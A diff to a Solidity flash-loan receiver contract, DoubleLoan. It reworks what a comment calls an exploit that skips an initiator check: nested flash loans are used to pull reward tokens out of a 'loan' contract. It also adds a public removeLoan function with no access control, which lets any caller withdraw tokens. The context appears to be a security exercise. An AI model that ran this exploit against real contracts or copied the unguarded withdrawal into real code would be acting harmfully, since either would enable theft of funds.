@@ -18,6 +18,11 @@ contract DoubleLoan is IFlashLoanSimpleReceiver {
         POOL = IPool(ADDRESSES_PROVIDER.getPool());
     }
 
+    function removeLoan(address token, uint256 amount) external {
+        loan.removeLoan(token, amount);
+        IERC20(token).transfer(msg.sender, amount);
+    }
+
     function executeOperation(
         address asset,
         uint256 amount,
@@ -29,13 +34,13 @@ contract DoubleLoan is IFlashLoanSimpleReceiver {
         IERC20(asset).approve(address(POOL), amount + premium);
         // @todo define exploit by skipping initatior check
 
-        IERC20(asset).transfer(address(loan), amount / 2 + premium);
-        POOL.flashLoanSimple(address(loan), asset, amount / 4, "", 0);
+        IERC20(asset).transfer(address(loan), amount);
+        POOL.flashLoanSimple(address(loan), asset, amount, "", 0);
 
-        loan.removeLoan(loan.rewardToken(), amount / 2);
-        IERC20(loan.rewardToken()).transfer(initiator, amount / 2);
+        loan.removeLoan(loan.rewardToken(), amount);
+        IERC20(loan.rewardToken()).transfer(initiator, amount);
 
-        loan.removeLoan(asset, amount / 2);
+        // loan.removeLoan(asset, amount / 2);
 
         // @note he funds will be automatically pulled at the conclusion of your operation.
         return true;
